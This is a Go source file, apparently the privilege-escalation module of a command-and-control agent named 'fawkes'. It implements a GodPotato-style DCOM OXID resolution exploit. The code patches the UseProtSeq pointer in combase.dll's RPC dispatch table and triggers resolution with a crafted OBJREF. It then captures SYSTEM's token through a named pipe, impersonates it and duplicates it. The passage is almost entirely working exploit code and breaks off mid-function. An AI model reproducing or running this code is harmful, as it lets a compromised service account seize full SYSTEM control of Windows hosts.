//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// GodPotato-style DCOM OXID resolution abuse for SeImpersonate → SYSTEM.
// This technique hooks the RPC dispatch table in combase.dll to redirect
// OXID resolution to an attacker-controlled named pipe. When RPCSS (SYSTEM)
// connects to resolve the OXID, we impersonate its token.
//
// References:
// - https://github.com/BeichenDream/GodPotato
// - https://github.com/tylerdotrar/SigmaPotato
// - https://github.com/safedv/RustPotato

// orcbGUID is the ORCB RPC interface GUID (18f70770-8e64-11cf-9af1-0020af6e72f4)
// in little-endian byte order for memory scanning in combase.dll.
var orcbGUID = [16]byte{
	0x70, 0x07, 0xF7, 0x18, // Data1 LE
	0x64, 0x8E,             // Data2 LE
	0xCF, 0x11,             // Data3 LE
	0x9A, 0xF1, 0x00, 0x20, 0xAF, 0x6E, 0x72, 0xF4, // Data4
}

// OBJREF magic signature ("MEOW" in little-endian)
const objrefSignature = 0x574f454d

// OBJREF flags
const objrefStandard = 0x00000001

// COM IIDs
var iidIUnknown = [16]byte{
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
}

func utf16Encode(s string) []uint16 {
	result, _ := syscall.UTF16FromString(s)
	// Remove trailing null
	if len(result) > 0 && result[len(result)-1] == 0 {
		result = result[:len(result)-1]
	}
	return result
}

// potatoState holds the mutable state for the GodPotato technique
type potatoState struct {
	mu             sync.Mutex
	systemToken    windows.Token
	tokenCaptured  bool
	pipeName       string
	pipeUniqueName string
	hookError      string
	origFuncPtr    uintptr
	hookCalled     bool
	paramCount     int
	// Pre-computed DUALSTRINGARRAY bytes (built before hook install to avoid
	// fmt.Sprintf/allocations inside the RPC dispatch callback context)
	precomputedDSA []byte
}

var potatoGlobal potatoState

// Windows API procs for COM and memory operations
var (
	ole32DLL              = windows.NewLazySystemDLL("ole32.dll")
	procCoInitializeEx    = ole32DLL.NewProc("CoInitializeEx")
	procCoUninitialize    = ole32DLL.NewProc("CoUninitialize")
	procCoUnmarshalIntf   = ole32DLL.NewProc("CoUnmarshalInterface")
	procCreateObjrefMonik = ole32DLL.NewProc("CreateObjrefMoniker")
	procCreateBindCtx     = ole32DLL.NewProc("CreateBindCtx")
	procCoTaskMemFree     = ole32DLL.NewProc("CoTaskMemFree")

	procVirtualQuery   = kernel32NP.NewProc("VirtualQuery")
	procGetProcessHeap = kernel32NP.NewProc("GetProcessHeap")
	procHeapAlloc      = kernel32NP.NewProc("HeapAlloc")
	// procGetModuleHandleW is declared in spawn.go
)

// RPC_SERVER_INTERFACE represents the RPC server interface structure in combase.dll
type rpcServerInterface struct {
	Length                  uint32
	InterfaceID             [20]byte // RPC_IF_ID = GUID (16) + Version (4)
	TransferSyntax          [20]byte
	DispatchTable           uintptr // *RPC_DISPATCH_TABLE
	RpcProtseqEndpointCount uint32
	RpcProtseqEndpoint      uintptr
	DefaultManagerEpv       uintptr
	InterpreterInfo         uintptr // *MIDL_SERVER_INFO
	Flags                   uint32
}

type rpcDispatchTable struct {
	DispatchTableCount uint32
	DispatchTable      uintptr // *funcptr array
	Reserved           uintptr
}

type midlServerInfo struct {
	StubDesc        uintptr
	DispatchTable   uintptr // *funcptr array — the manager routines
	ProcString      uintptr
	FmtStringOffset uintptr
}

// readUseProtSeqParamCount reads the UseProtSeq parameter count from the MIDL
// NDR format string. GodPotato reads this at ProcString + FmtStringOffset[0] + 19.
// The parameter count varies by Windows version (typically 5-6 on modern Windows).
func readUseProtSeqParamCount(midlInfo *midlServerInfo) (int, error) {
	if midlInfo.ProcString == 0 || midlInfo.FmtStringOffset == 0 {
		return 0, fmt.Errorf("ProcString or FmtStringOffset is null")
	}
	// FmtStringOffset is an array of uint16; read offset for method 0 (UseProtSeq)
	fmtOffset0 := *(*uint16)(unsafe.Pointer(midlInfo.FmtStringOffset))
	// Parameter count is at offset 19 within the Oif procedure header
	paramCount := int(*(*byte)(unsafe.Pointer(midlInfo.ProcString + uintptr(fmtOffset0) + 19)))
	if paramCount < 4 || paramCount > 14 {
		return 0, fmt.Errorf("unexpected UseProtSeq parameter count: %d", paramCount)
	}
	return paramCount, nil
}

// buildPipeDSA pre-computes the DUALSTRINGARRAY bytes for the hook callback.
// This is called during setup (before hook install) so the callback itself
// does only minimal work: HeapAlloc + memcpy + pointer write.
func buildPipeDSA(pipeUniqueName string) []byte {
	endpoints := []string{
		"ncacn_np:localhost/pipe/" + pipeUniqueName + `[\pipe\epmapper]`,
		"ncacn_ip_tcp:127.0.0.1",
	}

	// Calculate entry count (in uint16 units)
	entriesCount := 3 // double-null end + empty sec binding + null
	for _, ep := range endpoints {
		entriesCount += len(ep) + 1
	}

	bufSize := entriesCount*2 + 10
	buf := make([]byte, bufSize) // zero-filled

	offset := 0
	// wNumEntries
	binary.LittleEndian.PutUint16(buf[offset:], uint16(entriesCount))
	offset += 2
	// wSecurityOffset
	binary.LittleEndian.PutUint16(buf[offset:], uint16(entriesCount-2))
	offset += 2
	// Write each endpoint as UTF-16LE characters
	for _, ep := range endpoints {
		for _, ch := range ep {
			binary.LittleEndian.PutUint16(buf[offset:], uint16(ch))
			offset += 2
		}
		offset += 2 // null terminator (already zero)
	}

	return buf[:4+entriesCount*2]
}

// handleUseProtSeq is the core hook handler called from the RPC dispatch context.
// It does ONLY minimal work: HeapAlloc, memcpy from pre-computed buffer, pointer write.
// No Go allocations, no fmt, no mutex — safe for RPC callback context.
func handleUseProtSeq(ppdsaNewBindings uintptr) uintptr {
	if ppdsaNewBindings == 0 {
		return 0
	}

	src := potatoGlobal.precomputedDSA
	srcLen := len(src)
	if srcLen == 0 {
		return 0
	}

	// Allocate from process heap (HEAP_ZERO_MEMORY = 0x08)
	hHeap, _, _ := procGetProcessHeap.Call()
	if hHeap == 0 {
		return 0
	}
	buf, _, _ := procHeapAlloc.Call(hHeap, 0x08, uintptr(srcLen))
	if buf == 0 {
		return 0
	}

	// Copy pre-computed DUALSTRINGARRAY
	dst := unsafe.Slice((*byte)(unsafe.Pointer(buf)), srcLen)
	copy(dst, src)

	// Write pointer to *ppdsaNewBindings (DUALSTRINGARRAY**)
	*(*uintptr)(unsafe.Pointer(ppdsaNewBindings)) = buf

	// Set flag without mutex (atomic store is safe enough for a bool diagnostic)
	potatoGlobal.hookCalled = true

	return 0 // RPC_S_OK
}

// createHookCallback creates a syscall.NewCallback with the correct number of
// parameters for this Windows version. The ppdsaNewBindings output is always
// the second-to-last parameter, regardless of the total count.
func createHookCallback(paramCount int) (uintptr, error) {
	switch paramCount {
	case 4:
		return syscall.NewCallback(func(a0, a1, a2, a3 uintptr) uintptr {
			return handleUseProtSeq(a2) // second-to-last
		}), nil
	case 5:
		return syscall.NewCallback(func(a0, a1, a2, a3, a4 uintptr) uintptr {
			return handleUseProtSeq(a3)
		}), nil
	case 6:
		return syscall.NewCallback(func(a0, a1, a2, a3, a4, a5 uintptr) uintptr {
			return handleUseProtSeq(a4)
		}), nil
	case 7:
		return syscall.NewCallback(func(a0, a1, a2, a3, a4, a5, a6 uintptr) uintptr {
			return handleUseProtSeq(a5)
		}), nil
	case 8:
		return syscall.NewCallback(func(a0, a1, a2, a3, a4, a5, a6, a7 uintptr) uintptr {
			return handleUseProtSeq(a6)
		}), nil
	case 9:
		return syscall.NewCallback(func(a0, a1, a2, a3, a4, a5, a6, a7, a8 uintptr) uintptr {
			return handleUseProtSeq(a7)
		}), nil
	case 10:
		return syscall.NewCallback(func(a0, a1, a2, a3, a4, a5, a6, a7, a8, a9 uintptr) uintptr {
			return handleUseProtSeq(a8)
		}), nil
	case 11:
		return syscall.NewCallback(func(a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10 uintptr) uintptr {
			return handleUseProtSeq(a9)
		}), nil
	case 12:
		return syscall.NewCallback(func(a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11 uintptr) uintptr {
			return handleUseProtSeq(a10)
		}), nil
	default:
		return 0, fmt.Errorf("unsupported UseProtSeq parameter count: %d (expected 4-12)", paramCount)
	}
}

// getSystemViaPotato implements the GodPotato DCOM OXID resolution exploit.
func getSystemViaPotato(oldIdentity string) structs.CommandResult {
	// Phase 0: Check SeImpersonatePrivilege
	if !checkPrivilege("SeImpersonatePrivilege") {
		return structs.CommandResult{
			Output:    "SeImpersonatePrivilege not available. This technique requires a service account (NETWORK SERVICE, LOCAL SERVICE, IIS, MSSQL, etc.).",
			Status:    "error",
			Completed: true,
		}
	}

	// Pin this goroutine to an OS thread — COM state is per-thread and
	// Go's scheduler can migrate goroutines between OS threads.
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Phase 1: Initialize COM (loads combase.dll) and scan for ORCB RPC interface
	procCoInitializeEx.Call(0, 0) // COINIT_MULTITHREADED = 0
	defer procCoUninitialize.Call()

	combaseBase, combaseSize, err := findModuleInfo("combase.dll")
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to find combase.dll: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	rpcIfaceAddr, err := scanForGUID(combaseBase, combaseSize, orcbGUID[:])
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to find ORCB RPC interface in combase.dll: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Phase 2: Parse RPC structures and locate UseProtSeq dispatch entry
	rpcIface := (*rpcServerInterface)(unsafe.Pointer(rpcIfaceAddr))
	if rpcIface.DispatchTable == 0 {
		return structs.CommandResult{
			Output:    "RPC_SERVER_INTERFACE dispatch table pointer is null",
			Status:    "error",
			Completed: true,
		}
	}

	dispTable := (*rpcDispatchTable)(unsafe.Pointer(rpcIface.DispatchTable))
	if dispTable.DispatchTable == 0 || dispTable.DispatchTableCount == 0 {
		return structs.CommandResult{
			Output:    "RPC dispatch table is empty",
			Status:    "error",
			Completed: true,
		}
	}

	// UseProtSeq is at index 0 in the MIDL_SERVER_INFO dispatch table
	midlInfo := (*midlServerInfo)(unsafe.Pointer(rpcIface.InterpreterInfo))
	if midlInfo == nil || midlInfo.DispatchTable == 0 {
		return structs.CommandResult{
			Output:    "MIDL_SERVER_INFO dispatch table is null",
			Status:    "error",
			Completed: true,
		}
	}

	// Read parameter count from MIDL format string (varies by Windows version)
	paramCount, paramErr := readUseProtSeqParamCount(midlInfo)
	if paramErr != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to read UseProtSeq param count: %v", paramErr),
			Status:    "error",
			Completed: true,
		}
	}
	potatoGlobal.paramCount = paramCount

	// Read the original UseProtSeq function pointer (index 0)
	useProtSeqSlot := midlInfo.DispatchTable
	origFunc := *(*uintptr)(unsafe.Pointer(useProtSeqSlot))
	potatoGlobal.origFuncPtr = origFunc

	// Phase 3: Extract our process's OXID BEFORE installing the hook.
	// CreateObjrefMoniker triggers OXID registration which may call UseProtSeq.
	// We must do this with the original (unhooked) dispatch to avoid deadlocks.
	oxid, oid, ipid, oxidErr := extractProcessOXID()
	if oxidErr != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to extract process OXID: %v", oxidErr),
			Status:    "error",
			Completed: true,
		}
	}

	// Phase 4: Create named pipe server
	pipeUniqueName := fmt.Sprintf("fawkes_%d", time.Now().UnixNano()%100000)
	pipeName := fmt.Sprintf(`\\.\pipe\%s\pipe\epmapper`, pipeUniqueName)
	potatoGlobal.pipeName = pipeName
	potatoGlobal.pipeUniqueName = pipeUniqueName
	potatoGlobal.tokenCaptured = false
	potatoGlobal.systemToken = 0
	potatoGlobal.hookCalled = false
	potatoGlobal.precomputedDSA = buildPipeDSA(pipeUniqueName)

	// Create the pipe with permissive DACL
	sd, sdErr := windows.NewSecurityDescriptor()
	if sdErr != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("NewSecurityDescriptor: %v", sdErr),
			Status:    "error",
			Completed: true,
		}
	}
	if err := sd.SetDACL(nil, true, false); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("SetDACL: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	sa := windows.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		SecurityDescriptor: sd,
		InheritHandle:      0,
	}

	pipeNamePtr, _ := windows.UTF16PtrFromString(pipeName)
	hPipe, _, pipeErr := procCreateNamedPipeW.Call(
		uintptr(unsafe.Pointer(pipeNamePtr)),
		PIPE_ACCESS_DUPLEX|FILE_FLAG_OVERLAPPED,
		PIPE_TYPE_MESSAGE|PIPE_READMODE_MESSAGE|PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES,
		PIPE_BUFFER_SIZE,
		PIPE_BUFFER_SIZE,
		0,
		uintptr(unsafe.Pointer(&sa)),
	)
	if hPipe == uintptr(windows.InvalidHandle) {
		return structs.CommandResult{
			Output:    fmt.Sprintf("CreateNamedPipe(%s): %v", pipeName, pipeErr),
			Status:    "error",
			Completed: true,
		}
	}
	pipeHandle := windows.Handle(hPipe)
	defer windows.CloseHandle(pipeHandle)

	// Start async ConnectNamedPipe
	event, _ := windows.CreateEvent(nil, 1, 0, nil)
	defer windows.CloseHandle(event)

	var overlapped windows.Overlapped
	overlapped.HEvent = event
	procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&overlapped)))

	// Phase 5: Create hook callback with correct parameter count and install
	hookCallback, hookErr := createHookCallback(paramCount)
	if hookErr != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to create hook callback: %v", hookErr),
			Status:    "error",
			Completed: true,
		}
	}

	// Make the dispatch table writable
	var oldProtect uint32
	err = windows.VirtualProtect(useProtSeqSlot, unsafe.Sizeof(uintptr(0)), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("VirtualProtect on dispatch table: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Replace the function pointer
	*(*uintptr)(unsafe.Pointer(useProtSeqSlot)) = hookCallback

	// Restore protection and original function pointer on exit
	defer func() {
		*(*uintptr)(unsafe.Pointer(useProtSeqSlot)) = origFunc
		windows.VirtualProtect(useProtSeqSlot, unsafe.Sizeof(uintptr(0)), oldProtect, &oldProtect)
	}()

	// Phase 6: Trigger OXID resolution via crafted OBJREF.
	// Run in a goroutine because CoUnmarshalInterface can block if RPCSS hangs.
	// The trigger goroutine needs its own COM initialization and thread pinning.
	triggerDone := make(chan error, 1)
	go func() {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		procCoInitializeEx.Call(0, 0)
		defer procCoUninitialize.Call()
		triggerDone <- triggerOXIDResolution(oxid, oid, ipid)
	}()

	// Wait for trigger to complete (5s) or proceed to pipe wait
	var triggerErr error
	select {
	case triggerErr = <-triggerDone:
		// trigger completed
	case <-time.After(5 * time.Second):
		triggerErr = fmt.Errorf("CoUnmarshalInterface blocked for >5s")
	}

	// Phase 7: Wait for pipe connection (SYSTEM connecting)
	waitResult, _ := windows.WaitForSingleObject(event, 10000) // 10s timeout
	if waitResult != windows.WAIT_OBJECT_0 {
		hookStatus := "NOT called"
		if potatoGlobal.hookCalled {
			hookStatus = "called"
		}
		bindingStr := "ncacn_np:localhost/pipe/" + pipeUniqueName + `[\pipe\epmapper]`
		errMsg := fmt.Sprintf("RPCSS did not connect to pipe within timeout.\nPipe: %s\nBinding: %s\nHook was %s (paramCount=%d)\nDSA size: %d bytes",
			pipeName, bindingStr, hookStatus, paramCount, len(potatoGlobal.precomputedDSA))
		if triggerErr != nil {
			errMsg += fmt.Sprintf("\nTrigger: %v", triggerErr)
		}
		return structs.CommandResult{
			Output:    errMsg,
			Status:    "error",
			Completed: true,
		}
	}

	// Phase 8: Impersonate the SYSTEM token
	ret, _, impErr := procImpersonateNamedPipeClient.Call(hPipe)
	if ret == 0 {
		procDisconnectNamedPipe.Call(hPipe)
		return structs.CommandResult{
			Output:    fmt.Sprintf("ImpersonateNamedPipeClient: %v", impErr),
			Status:    "error",
			Completed: true,
		}
	}

	clientIdentity, _ := GetCurrentIdentity()

	// Capture thread token
	var threadToken windows.Token
	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, true, &threadToken)
	if err != nil {
		err = windows.OpenThreadToken(windows.CurrentThread(), STEAL_TOKEN_ACCESS|TOKEN_QUERY, true, &threadToken)
	}
	if err != nil {
		procRevertToSelf.Call()
		procDisconnectNamedPipe.Call(hPipe)
		return structs.CommandResult{
			Output:    fmt.Sprintf("Connected as %s but failed to capture token: %v", clientIdentity, err),
			Status:    "error",
			Completed: true,
		}
	}

	// Duplicate to primary token
	var dupToken windows.Token
	err = windows.DuplicateTokenEx(threadToken, windows.MAXIMUM_ALLOWED, nil,
		windows.SecurityDelegation, windows.TokenPrimary, &dupToken)
	if err != nil {
		err = windows.DuplicateTokenEx(threadToken, windows.MAXIMUM_ALLOWED, nil,
			windows.SecurityImpersonation, windows.TokenImpersonation, &dupToken)
	}
	threadToken.Close()

	if err != nil {
		procRevertToSelf.Call()
		procDisconnectNamedPipe.Call(hPipe)
		return structs.CommandResult{
			Output:    fmt.Sprintf("Connected as %s but DuplicateTokenEx: %v", clientIdentity, err),
			Status:    "error",
			Completed: true,
		}
	}

	procRevertToSelf.Call()
	procDisconnectNamedPipe.Call(hPipe)

	// Store token
	if setErr := SetIdentityToken(dupToken); setErr != nil {
		windows.CloseHandle(windows.Handle(dupToken))
		return structs.CommandResult{
			Output:    fmt.Sprintf("Connected as %s but SetIdentityToken: %v", clientIdentity, setErr),
			Status:    "error",
			Completed: true,
		}
	}

	newIdentity, _ := GetCurrentIdentity()

	var sb strings.Builder
	sb.WriteString("=== GETSYSTEM SUCCESS (DCOM/Potato) ===\n\n")
	sb.WriteString(fmt.Sprintf("Technique: DCOM OXID resolution hook (GodPotato)\n"))
	sb.WriteString(fmt.Sprintf("Pipe: %s\n", pipeName))
	sb.WriteString(fmt.Sprintf("ParamCount: %d\n", paramCount))
	if oldIdentity != "" {
		sb.WriteString(fmt.Sprintf("Old: %s\n", oldIdentity))
	}
	sb.WriteString(fmt.Sprintf("New: %s\n", newIdentity))
	sb.WriteString("\nUse 'rev2self' to revert to original identity.\n")

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// findModuleInfo returns the base address and size of a loaded DLL.
func findModuleInfo(moduleName string) (uintptr, uintptr, error) {
	namePtr, err := windows.UTF16PtrFromString(moduleName)
	if err != nil {
		return 0, 0, err
	}

	handle, _, callErr := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(namePtr)))
	if handle == 0 {
		return 0, 0, fmt.Errorf("GetModuleHandle(%s): %v", moduleName, callErr)
	}

	// Query memory region to get the full module size
	type memoryBasicInformation struct {
		BaseAddress       uintptr
		AllocationBase    uintptr
		AllocationProtect uint32
		PartitionID       uint16
		_                 uint16
		RegionSize        uintptr
		State             uint32
		Protect           uint32
		Type              uint32
	}

	var mbi memoryBasicInformation
	ret, _, _ := procVirtualQuery.Call(handle, uintptr(unsafe.Pointer(&mbi)), unsafe.Sizeof(mbi))
	if ret == 0 {
		return handle, 0x1000000, nil // Default 16MB scan range
	}

	// Walk regions to find total module size
	totalSize := mbi.RegionSize
	addr := handle + mbi.RegionSize
	for {
		ret, _, _ = procVirtualQuery.Call(addr, uintptr(unsafe.Pointer(&mbi)), unsafe.Sizeof(mbi))
		if ret == 0 || mbi.AllocationBase != handle {
			break
		}
		totalSize += mbi.RegionSize
		addr += mbi.RegionSize
	}

	return handle, totalSize, nil
}

// scanForGUID scans module memory for the ORCB RPC interface GUID.
// Returns the address of the RPC_SERVER_INTERFACE structure that contains this GUID.
func scanForGUID(base, size uintptr, pattern []byte) (uintptr, error) {
	// The GUID appears at offset 4 in RPC_SERVER_INTERFACE (after the Length field)
	mem := unsafe.Slice((*byte)(unsafe.Pointer(base)), int(size))

	for i := 0; i <= len(mem)-len(pattern)-4; i++ {
		// Check at offset i+4 (GUID is after uint32 Length field)
		match := true
		for j := 0; j < len(pattern); j++ {
			if mem[i+4+j] != pattern[j] {
				match = false
				break
			}
		}
		if match {
			return base + uintptr(i), nil
		}
	}

	return 0, fmt.Errorf("ORCB GUID pattern not found in %d bytes of combase.dll", size)
}

// extractProcessOXID creates a COM object, marshals it via CreateObjrefMoniker,
// and parses the resulting OBJREF to extract our process's OXID, OID, and IPID.
// GodPotato requires the process's own OXID — a random OXID won't trigger
// the UseProtSeq callback because RPCSS won't find it in its OXID table.
func extractProcessOXID() (oxid [8]byte, oid [8]byte, ipid [16]byte, err error) {
	// Create a minimal IUnknown COM object
	iunknown := createMinimalIUnknown()
	if iunknown == 0 {
		err = fmt.Errorf("failed to create IUnknown object")
		return
	}

	// CreateObjrefMoniker(pUnknown, &pMoniker) → marshals the object
	var pMoniker uintptr
	ret, _, callErr := procCreateObjrefMonik.Call(iunknown, uintptr(unsafe.Pointer(&pMoniker)))
	if ret != 0 || pMoniker == 0 {
		err = fmt.Errorf("CreateObjrefMoniker: hr=0x%x %v", ret, callErr)
		return
	}
	defer comRelease(pMoniker)

	// CreateBindCtx(0, &pBindCtx)
	var pBindCtx uintptr
	ret, _, callErr = procCreateBindCtx.Call(0, uintptr(unsafe.Pointer(&pBindCtx)))
	if ret != 0 || pBindCtx == 0 {
		err = fmt.Errorf("CreateBindCtx: hr=0x%x %v", ret, callErr)
		return
	}
	defer comRelease(pBindCtx)

	// IMoniker::GetDisplayName(pBindCtx, NULL, &displayName)
	// GetDisplayName is at vtable index 20
	var pDisplayName uintptr
	monikerVtbl := *(*uintptr)(unsafe.Pointer(pMoniker))
	getDisplayNameFunc := *(*uintptr)(unsafe.Pointer(monikerVtbl + 20*unsafe.Sizeof(uintptr(0))))
	ret, _, callErr = syscall.SyscallN(getDisplayNameFunc, pMoniker, pBindCtx, 0, uintptr(unsafe.Pointer(&pDisplayName)))
	if ret != 0 || pDisplayName == 0 {
		err = fmt.Errorf("GetDisplayName: hr=0x%x %v", ret, callErr)
		return
	}
	defer procCoTaskMemFree.Call(pDisplayName)

	// Parse the display name: "objref:MEOW<base64>:"
	displayStr := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(pDisplayName)))

	// Strip "objref:" prefix and ":" suffix
	displayStr = strings.TrimPrefix(displayStr, "objref:")
	displayStr = strings.TrimSuffix(displayStr, ":")

	// Base64 decode to get raw OBJREF bytes
	objrefBytes, decErr := base64.StdEncoding.DecodeString(displayStr)
	if decErr != nil {
		// Try with padding
		for len(displayStr)%4 != 0 {
			displayStr += "="
		}
		objrefBytes, decErr = base64.StdEncoding.DecodeString(displayStr)
	}
	if decErr != nil {
		err = fmt.Errorf("decode OBJREF: %v (display=%s)", decErr, displayStr[:potatoMin(40, len(displayStr))])
		return
	}

	// Parse OBJREF structure to extract OXID, OID, IPID
	// OBJREF layout:
	//   offset 0:  Signature (4 bytes) = "MEOW"
	//   offset 4:  Flags (4 bytes) = OBJREF_STANDARD
	//   offset 8:  IID (16 bytes)
	//   offset 24: STDOBJREF.flags (4 bytes)
	//   offset 28: STDOBJREF.cPublicRefs (4 bytes)
	//   offset 32: STDOBJREF.oxid (8 bytes)
	//   offset 40: STDOBJREF.oid (8 bytes)
	//   offset 48: STDOBJREF.ipid (16 bytes)
	if len(objrefBytes) < 64 {
		err = fmt.Errorf("OBJREF too short: %d bytes", len(objrefBytes))
		return
	}

	copy(oxid[:], objrefBytes[32:40])
	copy(oid[:], objrefBytes[40:48])
	copy(ipid[:], objrefBytes[48:64])
	return
}

func potatoMin(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// createMinimalIUnknown creates a COM IUnknown object in Go that can be
// passed to CreateObjrefMoniker. The standard COM marshaler will use it
// to register an OXID with RPCSS.
func createMinimalIUnknown() uintptr {
	// Ensure callbacks stay alive (prevent GC)
	potatoGlobal.mu.Lock()
	defer potatoGlobal.mu.Unlock()

	// Build vtable with 3 IUnknown methods
	type iunknownVtbl struct {
		QueryInterface uintptr
		AddRef         uintptr
		Release        uintptr
	}

	vtbl := &iunknownVtbl{
		QueryInterface: syscall.NewCallback(func(this, riid, ppv uintptr) uintptr {
			if ppv == 0 {
				return 0x80004003 // E_POINTER
			}
			// Only succeed for IID_IUnknown — return E_NOINTERFACE for everything
			// else (especially IMarshal!) so COM uses standard OXID marshaling.
			// If we return S_OK for IMarshal, COM tries to call IMarshal methods
			// on our 3-entry IUnknown vtable, reading garbage and hanging.
			qiid := unsafe.Slice((*byte)(unsafe.Pointer(riid)), 16)
			isIUnknown := true
			for i := 0; i < 16; i++ {
				if qiid[i] != iidIUnknown[i] {
					isIUnknown = false
					break
				}
			}
			if isIUnknown {
				*(*uintptr)(unsafe.Pointer(ppv)) = this
				return 0 // S_OK
			}
			*(*uintptr)(unsafe.Pointer(ppv)) = 0
			return 0x80004002 // E_NOINTERFACE
		}),
		AddRef: syscall.NewCallback(func(this uintptr) uintptr {
			return 1
		}),
		Release: syscall.NewCallback(func(this uintptr) uintptr {
			return 0
		}),
	}

	// The COM object is just a pointer to its vtable pointer
	obj := &struct{ vtbl *iunknownVtbl }{vtbl: vtbl}
	return uintptr(unsafe.Pointer(obj))
}

// comRelease calls IUnknown::Release on a COM interface pointer.
func comRelease(punk uintptr) {
	if punk == 0 {
		return
	}
	vtblPtr := *(*uintptr)(unsafe.Pointer(punk))
	releaseFunc := *(*uintptr)(unsafe.Pointer(vtblPtr + 2*unsafe.Sizeof(uintptr(0))))
	syscall.SyscallN(releaseFunc, punk)
}

// triggerOXIDResolution constructs a crafted OBJREF with TCP bindings using
// the process's own OXID, and calls CoUnmarshalInterface to trigger OXID
// resolution through the hooked UseProtSeq callback.
func triggerOXIDResolution(oxid [8]byte, oid [8]byte, ipid [16]byte) error {
	// Build crafted OBJREF with our OXID but TCP bindings to 127.0.0.1
	objref := buildCraftedOBJREF(oxid, oid, ipid)

	// Create IStream wrapping our OBJREF
	stream, streamRelease, err := createOBJREFStream(objref)
	if err != nil {
		return fmt.Errorf("create IStream: %w", err)
	}
	defer streamRelease()

	// Call CoUnmarshalInterface to trigger OXID resolution.
	// This causes COM to contact RPCSS to resolve the OXID.
	// Since the DUALSTRINGARRAY specifies TCP (which we haven't registered),
	// RPCSS calls the ORCB UseProtSeq callback (which we hooked) to ask us
	// to register TCP. Our hook returns a pipe binding, and RPCSS (SYSTEM)
	// connects to our named pipe.
	var punk uintptr
	ret, _, _ := procCoUnmarshalIntf.Call(
		stream,
		uintptr(unsafe.Pointer(&iidIUnknown)),
		uintptr(unsafe.Pointer(&punk)),
	)

	if punk != 0 {
		comRelease(punk)
	}

	// CoUnmarshalInterface will likely return an error (the object's bindings
	// are fake), but the side effect of triggering OXID resolution is what we want.
	_ = ret
	return nil
}

// buildCraftedOBJREF constructs a standard OBJREF with the process's own
// OXID/OID/IPID but with TCP bindings to 127.0.0.1. This forces RPCSS
// to call UseProtSeq because the process hasn't registered TCP yet.
func buildCraftedOBJREF(oxid [8]byte, oid [8]byte, ipid [16]byte) []byte {
	buf := make([]byte, 0, 256)

	// Signature ("MEOW")
	sig := make([]byte, 4)
	binary.LittleEndian.PutUint32(sig, objrefSignature)
	buf = append(buf, sig...)

	// Flags (OBJREF_STANDARD)
	flags := make([]byte, 4)
	binary.LittleEndian.PutUint32(flags, objrefStandard)
	buf = append(buf, flags...)

	// IID (IID_IUnknown)
	buf = append(buf, iidIUnknown[:]...)

	// STDOBJREF.flags (4 bytes)
	stdobjFlags := make([]byte, 4)
	binary.LittleEndian.PutUint32(stdobjFlags, 0)
	buf = append(buf, stdobjFlags...)

	// STDOBJREF.cPublicRefs (4 bytes)
	pubRefs := make([]byte, 4)
	binary.LittleEndian.PutUint32(pubRefs, 1)
	buf = append(buf, pubRefs...)

	// STDOBJREF.oxid (8 bytes) — OUR process's OXID
	buf = append(buf, oxid[:]...)

	// STDOBJREF.oid (8 bytes) — OUR object's OID
	buf = append(buf, oid[:]...)

	// STDOBJREF.ipid (16 bytes) — OUR interface IPID
	buf = append(buf, ipid[:]...)

	// DUALSTRINGARRAY — TCP to 127.0.0.1 (forces UseProtSeq callback)
	dsArray := buildTCPDualStringArray()
	buf = append(buf, dsArray...)

	return buf
}

// buildTCPDualStringArray creates a DUALSTRINGARRAY pointing to 127.0.0.1
// via TCP (tower 0x07). Since our process only registered ALPC (local),
// the TCP binding forces RPCSS to call UseProtSeq to ask us to register TCP.
func buildTCPDualStringArray() []byte {
	towerID := uint16(0x0007) // ncacn_ip_tcp
	addr := utf16Encode("127.0.0.1")

	stringBinding := make([]byte, 0, 32)
	tb := make([]byte, 2)
	binary.LittleEndian.PutUint16(tb, towerID)
	stringBinding = append(stringBinding, tb...)
	for _, c := range addr {
		cb := make([]byte, 2)
		binary.LittleEndian.PutUint16(cb, c)
		stringBinding = append(stringBinding, cb...)
	}
	stringBinding = append(stringBinding, 0, 0) // null terminator
	stringBinding = append(stringBinding, 0, 0) // end of string bindings

	stringEntries := len(stringBinding) / 2

	// Security binding
	secBinding := []byte{0x0A, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00}
	secEntries := len(secBinding) / 2

	totalEntries := stringEntries + secEntries

	result := make([]byte, 4+totalEntries*2)
	binary.LittleEndian.PutUint16(result[0:2], uint16(totalEntries))
	binary.LittleEndian.PutUint16(result[2:4], uint16(stringEntries))
	copy(result[4:], stringBinding)
	copy(result[4+stringEntries*2:], secBinding)

	return result
}

func createOBJREFStream(objrefData []byte) (uintptr, func(), error) {
	// Use SHCreateMemStream from shlwapi.dll
